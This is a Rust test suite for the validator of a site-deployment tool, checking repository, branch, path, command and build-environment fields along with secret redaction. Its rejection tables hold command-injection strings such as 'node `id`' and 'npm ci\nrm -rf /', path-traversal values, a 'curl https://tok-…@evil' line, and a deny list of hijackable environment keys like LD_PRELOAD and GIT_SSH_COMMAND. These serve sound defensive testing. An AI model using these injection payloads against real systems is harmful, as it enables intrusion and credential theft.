use cite_edge::model::{Cpus, PackageManager, RenderMode, Slot, Source};
use cite_edge::status::{
    BuildEnvPatch, CAPABILITIES, LogsResponse, ManagerReport, SiteStatus, SlotStatus, TokenStatus,
};
use cite_edge::validate::validate_source;
use proptest::prelude::*;

fn src(repo: &str) -> Source {
    serde_json::from_value(serde_json::json!({ "repo": repo })).expect("minimal source")
}

fn with(f: impl FnOnce(&mut Source)) -> Source {
    let mut s = src("acme/shop");
    f(&mut s);
    s
}

fn refused(s: &Source, field: &str) {
    let err = validate_source(s).expect_err("should be refused");
    assert!(err.0.contains(field), "{err} does not name {field}");
}

#[test]
fn a_0_3_source_loads_and_round_trips_byte_identical() {
    let json = r#"{"repo":"acme/shop","branch":"main","runtime":"node","node_major":22,"poll_interval":"5m","secret":null}"#;
    let s: Source = serde_json::from_str(json).expect("old source");
    assert!(s.root_dir.is_none() && s.package_manager.is_none() && s.prune.is_none());
    assert_eq!(serde_json::to_string(&s).expect("ser"), json);
    validate_source(&s).expect("valid");
}

#[test]
fn new_fields_serialise_lowercase_and_unknown_fields_still_fail() {
    let s = with(|s| {
        s.package_manager = Some(PackageManager::Pnpm);
        s.rendering = Some(RenderMode::Ssr);
        s.prune = Some(false);
    });
    let v = serde_json::to_value(&s).expect("ser");
    assert_eq!(v["package_manager"], "pnpm");
    assert_eq!(v["rendering"], "ssr");
    assert_eq!(v["prune"], false);
    assert!(v.get("root_dir").is_none());
    assert!(serde_json::from_str::<Source>(r#"{"repo":"a/b","package_manager":"pip"}"#).is_err());
    assert!(serde_json::from_str::<Source>(r#"{"repo":"a/b","surprise":1}"#).is_err());
}

#[test]
fn repo_table() {
    for ok in ["a/b", "Acme-1/shop.site_2", "a.b/c..d"] {
        validate_source(&src(ok)).unwrap_or_else(|e| panic!("{ok}: {e}"));
    }
    let long = "a".repeat(101);
    for bad in [
        "",
        "a",
        "a/",
        "/b",
        "a/b/c",
        "./b",
        "a/..",
        "../b",
        "a/.",
        "a b/c",
        "a/b\n",
        "a/b\0",
        "a/b;rm",
        "a/$(x)",
        "\u{ff41}/b",
        "\u{e9}/b",
        &format!("{long}/b"),
        &format!("a/{long}"),
    ] {
        refused(&src(bad), "repo");
    }
    validate_source(&src(&format!("{}/{}", "a".repeat(100), "b".repeat(100)))).expect("max size");
}

#[test]
fn branch_table() {
    for ok in ["main", "feat/x-1", "release_1.2", "a", "v1.0.0"] {
        validate_source(&with(|s| s.branch = Some(ok.into())))
            .unwrap_or_else(|e| panic!("{ok}: {e}"));
    }
    let long = "a".repeat(256);
    for bad in [
        "",
        "-x",
        "/x",
        "x/",
        "x.",
        "x.lock",
        "a..b",
        "a b",
        "a~b",
        "a^b",
        "a:b",
        "a?b",
        "a*b",
        "a[b",
        "a\\b",
        "a\nb",
        "a\0b",
        "a\tb",
        "a@{b",
        "a//b",
        "m\u{430}in",
        &long,
    ] {
        refused(&with(|s| s.branch = Some(bad.into())), "branch");
    }
}

#[test]
fn runtime_node_major_and_poll_tables() {
    for rt in ["node", "bun", "static", "rust"] {
        validate_source(&with(|s| s.runtime = Some(rt.into()))).expect(rt);
    }
    for rt in ["Node", "python", "", "node;"] {
        refused(&with(|s| s.runtime = Some(rt.into())), "runtime");
    }
    for major in [22, 24] {
        validate_source(&with(|s| s.node_major = Some(major))).expect("major");
    }
    for major in [0, 18, 20, 23, 25] {
        refused(&with(|s| s.node_major = Some(major)), "node_major");
    }
    validate_source(&with(|s| {
        s.runtime = Some("rust".into());
        s.node_major = Some(0);
    }))
    .expect("rust ignores node_major");
    for ok in [
        "off", "OFF", "0", "1m", "60s", "5m", "1h", "2d", "60000ms", "366d",
    ] {
        validate_source(&with(|s| s.poll_interval = Some(ok.into())))
            .unwrap_or_else(|e| panic!("{ok}: {e}"));
    }
    for bad in [
        "",
        "5",
        "m",
        "59s",
        "30s",
        "999ms",
        "1x",
        "-5m",
        "1.5h",
        "5 m",
        "367d",
        "5m\u{0}",
        "\u{ff11}m",
    ] {
        refused(
            &with(|s| s.poll_interval = Some(bad.into())),
            "poll_interval",
        );
    }
}

#[test]
fn relative_path_table() {
    let long = "a".repeat(256);
    for field in ["root_dir", "output_dir", "spa_fallback"] {
        let set = |v: &str| {
            with(|s| {
                let v = Some(v.to_string());
                match field {
                    "root_dir" => s.root_dir = v,
                    "output_dir" => s.output_dir = v,
                    _ => s.spa_fallback = v,
                }
            })
        };
        for ok in [
            "web",
            "apps/web",
            "dist",
            "./dist",
            "a_b-c.d/e",
            "index.html",
            &"a".repeat(255),
        ] {
            validate_source(&set(ok)).unwrap_or_else(|e| panic!("{field} {ok}: {e}"));
        }
        for bad in [
            "",
            "/etc",
            "/",
            "..",
            "../x",
            "a/../b",
            "a/..",
            "-rf",
            "a b",
            "a\nb",
            "a\0b",
            "a;b",
            "a$b",
            "a`b`",
            "a$(b)",
            "a'b",
            "a\"b",
            "a\\b",
            "\u{ff44}ist",
            "d\u{ef}st",
            "~/x",
            &long,
        ] {
            refused(&set(bad), field);
        }
    }
}

#[test]
fn shell_command_table() {
    let long = "a".repeat(1025);
    for field in ["install_command", "build_command"] {
        let set = |v: &str| {
            with(|s| {
                let v = Some(v.to_string());
                if field == "install_command" {
                    s.install_command = v;
                } else {
                    s.build_command = v;
                }
            })
        };
        for ok in [
            "npm ci",
            "pnpm install --frozen-lockfile && pnpm build",
            "make \"all\"",
            &"a".repeat(1024),
        ] {
            validate_source(&set(ok)).unwrap_or_else(|e| panic!("{field} {ok}: {e}"));
        }
        for bad in [
            "",
            "   ",
            "npm ci\nrm -rf /",
            "npm\rci",
            "a\0b",
            "a\tb",
            "a\u{7f}",
            "a\u{1b}[0m",
            &long,
        ] {
            refused(&set(bad), field);
        }
    }
}

#[test]
fn start_command_table() {
    let set = |v: &str| with(|s| s.start_command = Some(v.into()));
    for ok in [
        "node server.js",
        "node build/index.js --port 8080",
        "./bin/serve",
        "/usr/bin/node 'a;b'",
        "node \"a b\"",
        "bun run.ts",
        "serve -s dist",
    ] {
        validate_source(&set(ok)).unwrap_or_else(|e| panic!("{ok}: {e}"));
    }
    let long = format!("node {}", "a".repeat(1030));
    for bad in [
        "",
        " ",
        "node a;b",
        "node a|b",
        "node a&b",
        "node a>b",
        "node a<b",
        "node `id`",
        "node $(id)",
        "node $HOME",
        "node {a}",
        "node (a)",
        "node *.js",
        "node a?",
        "node ~",
        "node !x",
        "node #c",
        "node a\\ b",
        "node \"$HOME\"",
        "node \"`id`\"",
        "node \"a\\b\"",
        "node 'a",
        "node \"a",
        "node\nid",
        "node\0",
        "npm start",
        "npx serve",
        "pnpm start",
        "yarn start",
        "cargo run",
        "sh -c x",
        "bash x",
        "env FOO=1 node x",
        "/bin/sh x",
        "/usr/bin/env node",
        "'npm' start",
        "FOO=1 node x",
        &long,
    ] {
        refused(&set(bad), "start_command");
    }
}

#[test]
fn static_rendering_conflicts_with_a_start_command() {
    let mut s = with(|s| s.start_command = Some("node server.js".into()));
    s.rendering = Some(RenderMode::Static);
    refused(&s, "rendering");
    s.rendering = Some(RenderMode::Ssr);
    validate_source(&s).expect("ssr with start");
    s.start_command = None;
    s.rendering = Some(RenderMode::Static);
    validate_source(&s).expect("static without start");
}

#[test]
fn resource_limits_validate_and_round_trip() {
    let json = r#"{"repo":"acme/shop","secret":null,"memory_mb":512,"cpus":1.5,"build_memory_mb":4096,"build_cpus":2.0}"#;
    let s: Source = serde_json::from_str(json).expect("resources");
    assert_eq!(s.cpus, Some(Cpus(1.5)));
    let v = serde_json::to_value(&s).expect("ser");
    assert_eq!(v["cpus"].as_f64(), Some(1.5));
    assert_eq!(v["memory_mb"], 512);
    assert_eq!(serde_json::from_value::<Source>(v).expect("de"), s);
    validate_source(&s).expect("valid");
    for mb in [256, 1_048_576] {
        validate_source(&with(|s| {
            s.memory_mb = Some(mb);
            s.build_memory_mb = Some(mb);
        }))
        .expect("memory bounds");
    }
    for mb in [0, 255, 1_048_577, u32::MAX] {
        refused(&with(|s| s.memory_mb = Some(mb)), "memory_mb");
        refused(&with(|s| s.build_memory_mb = Some(mb)), "build_memory_mb");
    }
    for c in [0.25, 1.0, 1024.0] {
        validate_source(&with(|s| {
            s.cpus = Some(Cpus(c));
            s.build_cpus = Some(Cpus(c));
        }))
        .expect("cpu bounds");
    }
    for c in [
        f32::NAN,
        f32::INFINITY,
        f32::NEG_INFINITY,
        0.0,
        -1.0,
        0.05,
        0.1,
        0.24,
        1024.5,
        1e9,
    ] {
        refused(&with(|s| s.cpus = Some(Cpus(c))), "cpus");
        refused(&with(|s| s.build_cpus = Some(Cpus(c))), "build_cpus");
    }
    let off: Source = serde_json::from_str(r#"{"repo":"a/b","cpus":null}"#).expect("null");
    assert!(off.cpus.is_none());
    assert!(!serde_json::to_string(&off).expect("ser").contains("cpus"));
}

#[test]
fn slug_table() {
    let set = |v: &str| with(|s| s.framework = Some(v.to_string()));
    for ok in ["next", "sveltekit", "a-b-1", &"a".repeat(32)] {
        validate_source(&set(ok)).unwrap_or_else(|e| panic!("framework {ok}: {e}"));
    }
    for bad in [
        "",
        "Next",
        "a_b",
        "a b",
        "a/b",
        "a\n",
        "\u{ff4e}ext",
        &"a".repeat(33),
    ] {
        refused(&set(bad), "framework");
    }
}

#[test]
fn a_per_site_forge_is_refused_but_still_loads() {
    for forge in ["github", "gitlab", "a-b-1", "Not A Slug"] {
        let s = with(|s| s.forge = Some(forge.to_string()));
        let err = validate_source(&s).expect_err(forge);
        assert!(
            err.0.contains("forge") && err.0.contains("CITE_STACK_FORGE"),
            "{err}"
        );
        let text = serde_json::to_string(&s).expect("ser");
        let back: Source = serde_json::from_str(&text).expect("a stored forge still parses");
        assert_eq!(back.forge.as_deref(), Some(forge));
    }
    validate_source(&with(|s| s.forge = Some(String::new()))).expect("empty means unset");
    validate_source(&with(|s| s.forge = None)).expect("unset");
}

#[test]
fn errors_never_echo_command_text_or_the_secret() {
    let s = Source {
        secret: Some("whsec-top-secret".into()),
        install_command: Some("curl https://tok-0123456789@evil\n".into()),
        ..src("acme/shop")
    };
    let err = validate_source(&s).expect_err("refused");
    assert!(
        !err.0.contains("tok-0123456789") && !err.0.contains("whsec"),
        "{err}"
    );
}

#[test]
fn validate_site_checks_the_source() {
    let mut site: cite_edge::model::Site = serde_json::from_value(serde_json::json!({
        "id": "a", "name": "a", "hosts": ["a.com"],
        "blue": {"targets": []}, "green": {"targets": []}, "active": "blue",
        "source": {"repo": "acme/shop", "node_major": 22}
    }))
    .expect("site");
    cite_edge::validate::validate_site(&site).expect("valid");
    site.source.as_mut().expect("source").node_major = Some(18);
    cite_edge::validate::validate_site(&site).expect("a stored legacy source still loads");
    let err = cite_edge::validate::validate_site_strict(&site).expect_err("refused");
    assert!(
        err.0.contains("node_major") && err.0.contains("site a"),
        "{err}"
    );
}

proptest! {
    #[test]
    fn valid_sources_validate_and_round_trip(
        repo in "[A-Za-z0-9_-]{1,20}/[A-Za-z0-9_-]{1,20}",
        branch in proptest::option::of("[a-z][a-z0-9_-]{0,20}(/[a-z0-9_-]{1,10}){0,2}"),
        root in proptest::option::of("[a-z0-9_][a-z0-9_-]{0,9}(/[a-z0-9_-]{1,10}){0,3}"),
        out in proptest::option::of("[a-z0-9_][a-z0-9_-]{0,9}(/[a-z0-9_-]{1,10}){0,3}"),
        build in proptest::option::of("[a-z][ -~]{0,200}"),
        start in proptest::option::of("serve-[a-z]{1,8}( [a-z0-9=_./-]{1,10}){0,4}"),
        slug in proptest::option::of("[a-z0-9-]{1,32}"),
        major in proptest::option::of(prop_oneof![Just(22u8), Just(24u8)]),
        pm in proptest::option::of(prop_oneof![
            Just(PackageManager::Npm), Just(PackageManager::Pnpm),
            Just(PackageManager::Yarn), Just(PackageManager::Bun)]),
        prune in proptest::option::of(any::<bool>()),
    ) {
        let s = Source {
            branch,
            runtime: Some("node".into()),
            node_major: major,
            poll_interval: Some("5m".into()),
            root_dir: root,
            package_manager: pm,
            build_command: build,
            output_dir: out,
            rendering: start.as_ref().map(|_| RenderMode::Ssr),
            start_command: start,
            framework: slug,
            prune,
            ..src(&repo)
        };
        prop_assert!(validate_source(&s).is_ok(), "{:?}", validate_source(&s));
        let text = serde_json::to_string(&s).unwrap();
        let back: Source = serde_json::from_str(&text).unwrap();
        prop_assert_eq!(&back, &s);
        prop_assert_eq!(serde_json::to_string(&back).unwrap(), text);
    }

    #[test]
    fn hostile_paths_with_dotdot_segments_are_refused(a in "[a-z]{0,5}", b in "[a-z]{0,5}") {
        let p = format!("{a}/../{b}");
        prop_assert!(validate_source(&with(|s| s.root_dir = Some(p))).is_err());
    }
}

#[test]
fn status_types_tolerate_unknown_and_missing_fields() {
    let s: SiteStatus = serde_json::from_str("{}").expect("empty");
    assert_eq!(s, SiteStatus::default());
    let s: SiteStatus = serde_json::from_str(
        r#"{"phase":"live","active":"green","future":{"x":1},
            "operation":{"kind":"deploy","step":"build","new":true},
            "slots":[{"slot":"blue","container":"c","restart_count":2,"extra":1,
              "report":{"v":2,"phase":"idle","detected":{"a":1},"unknown":[1]}}]}"#,
    )
    .expect("newer node");
    assert_eq!(s.active, Slot::Green);
    assert_eq!(s.operation.expect("op").step, "build");
    assert_eq!(s.slots[0].restart_count, 2);
    assert_eq!(s.slots[0].report.as_ref().expect("report").v, 2);
    let slot: SlotStatus = serde_json::from_str(r#"{"oom_killed":true}"#).expect("slot");
    assert!(slot.oom_killed && slot.report.is_none() && slot.exit_code.is_none());
    let logs: LogsResponse =
        serde_json::from_str(r#"{"lines":[{"text":"hi","zz":1}],"q":1}"#).expect("logs");
    assert_eq!(logs.lines[0].text, "hi");
    assert!(!logs.truncated && logs.cursor.is_none());
    let t: TokenStatus = serde_json::from_str(r#"{"source":"site","other":1}"#).expect("token");
    assert!(!t.site_token_set && t.verified.is_none());
}

#[test]
fn manager_report_debug_hides_the_token() {
    let r: ManagerReport = serde_json::from_str(r#"{"token":"ghs_secretvalue"}"#).expect("report");
    assert!(!format!("{r:?}").contains("ghs_secretvalue"));
    assert_eq!(r.token.as_deref(), Some("ghs_secretvalue"));
}

fn patch(set: &[(&str, &str)], unset: &[&str]) -> BuildEnvPatch {
    BuildEnvPatch {
        set: set
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect(),
        unset: unset.iter().map(|k| k.to_string()).collect(),
    }
}

#[test]
fn build_env_patch_table() {
    patch(&[("API_URL", "https://x"), ("_A1", "")], &["OLD"])
        .validate()
        .expect("valid");
    for key in [
        "",
        "api",
        "1A",
        "A-B",
        "A B",
        "CITE_TOKEN",
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "LD_AUDIT",
        "NODE_OPTIONS",
        "NODE_EXTRA_CA_CERTS",
        "HOME",
        "PATH",
        "TMPDIR",
        "XDG_CONFIG_HOME",
        "SSL_CERT_FILE",
        "SSL_CERT_DIR",
        "HTTP_PROXY",
        "HTTPS_PROXY",
        "NO_PROXY",
        "ALL_PROXY",
        "GIT_SSH_COMMAND",
        "PNPM_HOME",
        "NPM_CONFIG_REGISTRY",
        "npm_config_registry",
        "http_proxy",
        &"A".repeat(65),
    ] {
        assert!(patch(&[(key, "v")], &[]).validate().is_err(), "{key:?}");
    }
    patch(&[("A".repeat(64).as_str(), "v")], &[])
        .validate()
        .expect("64 chars");
    assert!(patch(&[], &["bad-key"]).validate().is_err());
    assert!(patch(&[("A", "1")], &["A"]).validate().is_err());
    assert!(patch(&[("A", "a\nb")], &[]).validate().is_err());
    assert!(patch(&[("A", "a\0b")], &[]).validate().is_err());
    let over = "x".repeat(4097);
    assert!(patch(&[("A", over.as_str())], &[]).validate().is_err());
    patch(&[("A", &over[..4096])], &[])
        .validate()
        .expect("4096 bytes");
}

#[test]
fn build_env_patch_limits_and_redaction() {
    let mut many = BuildEnvPatch::default();
    for i in 0..65 {
        many.set.insert(format!("K{i}"), "v".into());
    }
    assert!(many.validate().is_err());
    many.set.remove("K64");
    many.validate().expect("64 keys");
    let mut big = BuildEnvPatch::default();
    for i in 0..4 {
        big.set.insert(format!("K{i}"), "x".repeat(4096));
    }
    assert!(big.validate().expect_err("too big").0.contains("12 KiB"));
    let p = patch(&[("TOKEN_X", "hunter2-value")], &[]);
    let shown = format!("{p:?}");
    assert!(shown.contains("TOKEN_X") && !shown.contains("hunter2"));
    let err = patch(&[("PATH", "hunter2-value")], &[])
        .validate()
        .expect_err("denied");
    assert!(!err.0.contains("hunter2"));
    assert!(serde_json::from_str::<BuildEnvPatch>(r#"{"set":{},"extra":1}"#).is_err());
}

// The quoted names of one const array in a sibling crate's source, so the lists cannot drift apart.
fn quoted_list(source: &str, name: &str) -> Vec<String> {
    let start = source
        .find(&format!("const {name}:"))
        .unwrap_or_else(|| panic!("{name} not found"));
    let body = &source[start..];
    let body = &body[body.find('=').expect("=")..body.find("];").expect("];")];
    let names: Vec<String> = body
        .split('"')
        .skip(1)
        .step_by(2)
        .map(str::to_string)
        .collect();
    assert!(!names.is_empty(), "{name} is empty");
    names
}

const PROXY_ENV: &str = include_str!("../../cite-dockerproxy/src/envval.rs");
const EXECUTOR_ENV: &str = include_str!("../../cite-executor/src/userenv.rs");
const CORE_CONFIG: &str = include_str!("../../cite-core/src/config.rs");

#[test]
fn runtime_env_refuses_what_the_proxy_and_executor_refuse() {
    let proxy_own = quoted_list(PROXY_ENV, "EXECUTOR_OWN_KEYS");
    assert_eq!(proxy_own, cite_edge::status::EXECUTOR_OWN_ENV.to_vec());
    assert_eq!(
        proxy_own,
        ["PORT", "NODE_ENV", "HOST", "HOSTNAME", "NITRO_HOST"]
    );
    let mut refused = proxy_own;
    refused.extend(quoted_list(PROXY_ENV, "DENIED_KEYS"));
    refused.extend(quoted_list(EXECUTOR_ENV, "DENIED"));
    for prefix in quoted_list(EXECUTOR_ENV, "DENIED_PREFIXES")
        .into_iter()
        .chain(quoted_list(PROXY_ENV, "DENIED_PREFIXES"))
    {
        refused.push(format!("{prefix}X"));
    }
    for key in &refused {
        let err = patch(&[(key, "v")], &[]).validate_runtime().expect_err(key);
        assert!(err.0.contains("runtime env"), "{}", err.0);
    }
    for key in ["NODE_ENV", "PORT", "HOST", "NITRO_HOST"] {
        patch(&[(key, "production")], &[])
            .validate()
            .expect("a build may set it");
    }
    patch(
        &[("API_URL", "https://x"), ("SHELL", "/bin/sh")],
        &["NODE_ENV"],
    )
    .validate_runtime()
    .expect("the executor accepts these and an unset is always allowed");
}

#[test]
fn build_env_refuses_what_the_manager_refuses() {
    let mut refused = quoted_list(CORE_CONFIG, "RESERVED_BUILD_KEYS");
    for prefix in quoted_list(CORE_CONFIG, "RESERVED_BUILD_PREFIXES") {
        refused.push(format!("{prefix}X"));
    }
    refused.extend(
        [
            "SHELL",
            "BASH_ENV",
            "NODE_PATH",
            "TMP",
            "CARGO_HOME",
            "LD_BIND_NOW",
            "DYLD_INSERT_LIBRARIES",
            "YARN_CACHE_FOLDER",
            "COREPACK_HOME",
            "REQUESTS_CA_BUNDLE",
            "CURL_CA_BUNDLE",
        ]
        .map(str::to_string),
    );
    for key in &refused {
        let err = patch(&[(key, "v")], &[]).validate().expect_err(key);
        assert!(err.0.contains("build env"), "{}", err.0);
    }
}

#[test]
fn capabilities_are_the_thirteen_known_names() {
    assert_eq!(CAPABILITIES.len(), 13);
    assert!(CAPABILITIES.contains(&"site-status") && CAPABILITIES.contains(&"forges"));
    assert!(CAPABILITIES.contains(&"analytics-filters"));
    let mut sorted = CAPABILITIES.to_vec();
    sorted.sort_unstable();
    sorted.dedup();
    assert_eq!(sorted.len(), 13);
}
